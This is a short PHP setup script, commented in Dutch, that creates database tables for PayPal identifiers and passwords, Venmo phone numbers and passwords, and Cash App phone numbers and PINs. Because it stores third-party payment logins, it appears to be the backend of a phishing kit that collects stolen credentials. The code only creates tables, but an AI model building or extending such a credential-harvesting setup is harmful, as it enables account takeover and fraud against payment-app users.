<?php
require_once('db_connect.php');

// Query om paypal_flow aan te maken
$paypal_sql = "CREATE TABLE IF NOT EXISTS paypal_flow (
    id INT AUTO_INCREMENT PRIMARY KEY,
    identifier VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";

// Query om venmo_data aan te maken
$venmo_sql = "CREATE TABLE IF NOT EXISTS venmo_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    phone_number VARCHAR(20) NOT NULL,
    password VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";

// Query om cashapp_data aan te maken
$cashapp_sql = "CREATE TABLE IF NOT EXISTS cashapp_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    phone_number VARCHAR(20) NOT NULL,
    pin VARCHAR(10),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";

// Voer alle queries uit
$conn->query($paypal_sql);
$conn->query($venmo_sql);
$conn->query($cashapp_sql);

echo "Tabellen aangemaakt (indien nog niet bestaand).";

$conn->close();
?>
